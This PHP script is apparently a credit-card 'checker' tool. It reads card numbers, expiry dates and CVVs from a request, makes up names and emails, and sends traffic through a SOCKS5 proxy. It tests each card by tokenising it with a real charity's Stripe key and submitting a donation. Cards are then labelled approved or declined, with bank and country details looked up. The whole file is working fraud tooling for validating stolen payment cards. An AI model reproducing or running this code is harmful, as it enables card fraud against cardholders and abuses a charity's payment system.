<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

If(strlen($ano) > 2)
{
  $ano = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
	$nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
	return $nombre;
}
function datosapellido(){
	$apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
	return $apellido;
}


function email($nombre){
	$email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
	return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: api.stripe.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Accept: application/json',
'Referer: https://js.stripe.com/v3/controller-e5a3104782ffac207edc3af004b9574b.html',
'Content-Type: application/x-www-form-urlencoded',
'Connection: keep-alive'));

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$nombre.'+'.$apellido.'&card[address_line1]=&card[address_city]=&card[address_zip]=10001&card[currency]=USD&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=2a88d519-e56f-467a-9c63-c361a277ff54&muid=3190efac-5abc-4dac-9a48-03367b5b0064&sid=300c2fa4-1b47-44d1-8dfa-e0eb6728f2c3&payment_user_agent=stripe.js%2Fb78d06c%3B+stripe-js-v3%2Fb78d06c&referrer=https%3A%2F%2Fsecure.avaaz.org%2Fdonate%2Fpub-iframe.php%2F%3Fcid%3D3116%26lang%3Des%26sourceUrl%3Dhttps%253A%252F%252Fsecure.avaaz.org%252Fes%252Fdonate%252F&key=pk_live_eT3tlxY6x7Nzg9eDNkMYz99F&pasted_fields=number');



$b_pago = curl_exec($ch);

$token = trim(strip_tags(getstr($b_pago,'id": "','"')));


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.avaaz.org/donate/DonationStripeSubmit.php?preview=yes');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: secure.avaaz.org',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Referer: https://secure.avaaz.org/donate/pub-iframe.php/?cid=3116&lang=es&sourceUrl=https%3A%2F%2Fsecure.avaaz.org%2Fes%2Fdonate%2F',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With: XMLHttpRequest',
'Connection: keep-alive'));      

curl_setopt($ch, CURLOPT_POSTFIELDS, 'sourceUrl=https%3A%2F%2Fsecure.avaaz.org%2Fes%2Fdonate%2F&cid=3116&pa=0&lang=es&apiKey=&amount=10&currency=USD&amountOtherInput=&donationType=1&firstName='.$nombre.'&lastName='.$apellido.'&Email='.$email.'&CountryID=81&zip=10001&Address=&city=&paymentType=creditcard&paymentFamily=cc&paymentCardType=&stripeToken='.$token.'&stripeGatewayId=30&supports_history_api=true&secure_validation=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&used_js=Thu+Apr+26+2018+21%3A44%3A23+GMT-0300&privacy_policy_text=%3Ca+href%3D%22https%3A%2F%2Fwww.avaaz.org%2Fes%2Fprivacy%22+target%3D%22_blank%22%3EAvaaz+proteger%C3%A1+tu+privacidad%3C%2Fa%3E+y+te+mantendr%C3%A1+al+corriente+de+esta+y+otras+campa%C3%B1as.&privacy_policy_version=');
$b_pago = curl_exec($ch);



$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "fa fa-cc-mastercard";
}else if($cbin == "4"){
$cbin = "fa fa-cc-visa";
}
$valores = array('USD$ 1,00','USD$ 5,00','USD$ 1,40','USD$ 4,80','USD$ 2,00','USD$ 7,00','USD$ 10,00','USD$ 3,00','USD$ 3,40','USD$ 5,50');
$p_pago = $valores[mt_rand(0,9)];

 if (strpos($b_pago, 'Your card was declined.')) { 
 echo '<tr><td><font size="2"><font color="#0bbaee"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#F01005" size="1">Reprovada ✘</font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#F01005" size="1">'.$p_pago.'</font></td><td><font size="1">#Unc3ns0r3d</font></td></tr>';
  }else if (strpos($b_pago, 'cvv')){
    $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco     = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand     = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$telefono = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitud = trim(strip_tags(getstr($bin,'latitud":',',')));
$longitud = trim(strip_tags(getstr($bin,'longitud":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
 echo '<tr><td><font size="2"><font color="#00FF00"><i class="'.$cbin.'" aria-hidden="true"></i></font></font></td><td><font color="#00FF00" size="1">Aprovada ✔ </font></td><td><font size="1">'.$cc.'</font></td><td><font size="1">'.$mes.'/'.$ano.'</font></td><td><font size="1">'.$cvv.'</font></td><td><font></font><font color="#00FF00" size="1">'.$p_pago.'</font></td><td><font size="1"> Pais: '.$pais.' | Banco: '.$banco.' | Nível: '.$level.' | Tipo : '.$tipo.' </font> </td><td><font size="1">#Unc3ns0r3d</font></td></tr>';
  }
curl_close($ch);
ob_flush();
echo $b_pago;
?>